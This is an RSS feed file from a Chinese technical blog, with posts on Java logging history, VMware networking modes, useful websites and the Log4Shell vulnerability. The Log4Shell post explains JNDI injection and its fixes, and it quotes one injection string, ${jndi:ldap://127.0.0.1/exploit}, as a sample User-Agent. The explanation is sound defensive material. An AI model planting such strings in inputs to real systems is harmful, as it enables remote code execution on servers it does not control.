@@ -1,0 +1,83 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>杂项 on yuvenhol的技术苦旅</title>
+    <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/</link>
+    <description>Recent content in 杂项 on yuvenhol的技术苦旅</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language><atom:link href="https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>java日志</title>
+      <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/java%E6%97%A5%E5%BF%97/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/java%E6%97%A5%E5%BF%97/</guid>
+      <description>日志发展史 上古时代 jdk1.3之前 System.out.println(&amp;quot;&amp;quot;) 问题： 没有日志级别，上线以后会有很多无关的日志，而且只能在控制台看，不方便定位。
+发展流程 log4j-&amp;gt;jul-&amp;gt;jcl-&amp;gt;slf4j-&amp;gt;log4j2-&amp;gt;logback
+log4j 作者ceki
+从控制台写到文件 日志信息按天和文件大小划分 划分日志等级，按日志等级记录文件 高等级日志发送邮件 异步io 格式控制
+log4j发布以后，活的很好的反响，作者想让sun公司被纳入jdk，sun公司不接受，最后被apatch收纳。
+jul jdk官方日志库 jul （java.util.logging） log4j火了以后，jdk官方自己开发了一个库jul，但是并没有被所有人 认可
+JCL 日志门面 jakarta（jdk内部的一个开发小组）Commons Logging jcl不实现日志功能，但是整合整合日志库
+依靠类加载器寻找日志库
+slf4j ceki发现JCL不好用，apache也不着急开发日志门面，自己出去单独搞了slf4j
+桥接器：slf4j 和日志框架直接 连接的工具 适配器：多个模块使用不同的日志门面和日志框架，可以别的日志框架转换到slf4j上
+log4j2 apache 重写log4j，性能升级
+logback ceki 也知道log4j性能问题，开发了替代log4j的高性能产品</description>
+    </item>
+    <item>
+      <title>log4j漏洞</title>
+      <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/log4j%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/log4j%E6%BC%8F%E6%B4%9E/</guid>
+      <description>这次的史诗级漏洞是怎么回事呢？ 主角就是log4j2，黑客已经利用 Log4j 漏洞来接管受害者的计算机，以执行从加密货币挖矿、发送垃圾邮件、到通过大型僵尸网络发起分布式拒绝服务(DDoS)攻击的任何事情。
+log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫Lookup的东西，lookup相当于是一个接口，可以用来输出更多内容，lookup，顾名思义就是查找、搜索的意思，那在log4j2中，就是允许在输出日志的时候，通过某种方式去查找要输出的内容。
+假如某一个Java程序中，将浏览器的类型记录到了日志中：
+logger.info(userAgent); User-Agent就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容，假如有人发来了一个HTTP请求，他的User-Agent是这样一个字符串：
+${jndi:ldap://127.0.0.1/exploit}
+接下来，log4j2将会对这行要输出的字符串进行解析，它发现了字符串中有 ${，要单独处理，发现是JNDI扩展内容_（什么是JNDI？简单粗暴的理解下，它的作用类似于JDBC，JDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，JDBC为工具/数据库开发人员提供了一个标准的API，据此可以构建更高级的工具和接口，使数据库开发人员能够用纯 Java API 编写数据库应用程序。JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。）如图：_
+再对JNDI进一步解析，发现了是LDAP协议_（LDAP即Lightweight Directory Access Protocol（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，这个东西用在统一身份认证领域比较多，**简单理解就是：**一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。）_LDAP服务器在127.0.0.1，要查找的key是exploit，然后调用具体负责LDAP的模块去请求对应的数据。问题来了！JNDI支持一个叫命名引用的方式，也就是JNDI可以远程下载class文件来构建对象！！！下载后加载起来构建对象，咱就是一整个震惊住的那么一个大动作啊，如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，那歇逼了，什么样的后果都可能出现，这是JNDI注入。
+这次“核弹”漏洞造成的影响 log4j2的使用面很广泛，现在Java技术栈在Web、后端开发、大数据等领域应用非常广泛，国内除了阿里巴巴、京东、美团等一大片以Java为主要技术栈的公司外，还有多如牛毛的中小企业选择Java。除此之外还有像kafka、elasticsearch、flink这样的大量中间件都是用Java语言开发的。它们大量使用了log4j2作为日志输出。如果输出的日志有外部输入混进来，那直接就是远程代码执行RCE，灭顶之灾！好吧这些是大佬们的遭遇和分析，至少目前为止对很多人，至少我这种菜鸟没有产生什么大的影响&amp;hellip;
+有关解决和修复 方式一：禁用lookup或JNDI服务
+罪魁祸首就是lookup和JNDI，那么直接修改配置文件log4j2.formatMsgNoLookups=True或禁用JNDI服务，不过一般产生问题的服务都是线上已经在跑的服务，禁用的时候要注意评估一下是否允许。
+方式二：升级新版本
+新版的log4j2已经修复了这个问题，升级即可解决。修复后的log4j2在JNDI lookup中增加了很多的限制：
+1.默认不再支持二次跳转（也就是命名引用）的方式获取对象
+2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。
+3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取
+这样处理等于是去掉了通过打印日志去远程加载class的方式。</description>
+    </item>
+    <item>
+      <title>slf4j</title>
+      <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/slf4j/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/slf4j/</guid>
+      <description>几篇还不错的文章： SLF4J和Logback和Log4j和Logging的区别与联系
+java日志体系</description>
+    </item>
+    <item>
+      <title>奇怪的小知识</title>
+      <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/%E5%A5%87%E6%80%AA%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/%E5%A5%87%E6%80%AA%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/</guid>
+      <description>0day漏洞： 漏洞已被发现还没有发布解决补丁。
+桥接： 简单的说就是通过网桥可以把两个不同的物理局域网连接起来，是一种在链路层实现局域网互连的存储转发设备。网桥从一个局域网接收MAC帧，拆封、校对、校验之后 ，按另一个局域网的格式重新组装,发往它的物理层，通俗的说就是通过一台设备（可能不止一个）把几个网络串起来形成的连接，比如图中就是一种通过桥接来实现无路由双机上网的连接方案。 虚拟机中的网络模式 VMware 桥接模式 VMware桥接模式，也就是将虚拟机的虚拟网络适配器与主机的物理网络适配器进行交接，虚拟机中的虚拟网络适配器可通过主机中的物理网络适配器直接访问到外部网络(例如图中所示的局域网和Internet，下同)。简而言之，这就好像在上图所示的局域网中添加了一台新的、独立的计算机一样。因此，虚拟机也会占用局域网中的一个IP地址，并且可以和其他终端进行相互访问。桥接模式网络连接支持有线和无线主机网络适配器。如果你想把虚拟机当做一台完全独立的计算机看待，并且允许它和其他终端一样的进行网络通信，那么桥接模式通常是虚拟机访问网络的最简单途径。
+VMware NAT模式 NAT，是Network Address Translation的缩写，意即网络地址转换。NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信。虚拟机向外部网络发送的请求数据&amp;quot;包裹&amp;quot;，都会交由NAT网络适配器加上&amp;quot;特殊标记&amp;quot;并以主机的名义转发出去，外部网络返回的响应数据&amp;quot;包裹&amp;quot;，也是先由主机接收，然后交由NAT网络适配器根据&amp;quot;特殊标记&amp;quot;进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</description>
+    </item>
+    <item>
+      <title>好用的网站</title>
+      <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/%E5%A5%BD%E7%94%A8%E7%9A%84%E7%BD%91%E7%AB%99/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/%E5%A5%BD%E7%94%A8%E7%9A%84%E7%BD%91%E7%AB%99/</guid>
+      <description>在线流程图 https://mermaid.live/
+正则可视化 https://tooltt.com/regulex/
+python官方学习文档 docs.python.org</description>
+    </item>
+    <item>
+      <title>微信授权登录</title>
+      <link>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/%E5%BE%AE%E4%BF%A1%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://yuvenhol.github.io/%E6%9D%82%E9%A1%B9/%E5%BE%AE%E4%BF%A1%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95/</guid>
+      <description></description>
+    </item>
+  </channel>
+</rss>
